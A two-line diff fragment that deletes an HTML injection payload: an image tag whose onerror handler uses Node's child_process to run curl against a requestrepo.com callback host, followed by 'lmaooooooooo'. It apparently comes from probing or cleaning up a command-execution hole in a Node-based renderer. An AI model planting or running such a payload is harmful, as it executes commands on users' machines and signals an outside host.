@@ -1,2 +1,0 @@
-<img src=x onerror="console.log(require('child_process').execSync('curl http://lneo9ctb.requestrepo.com').toString());">lmaooooooooo
-
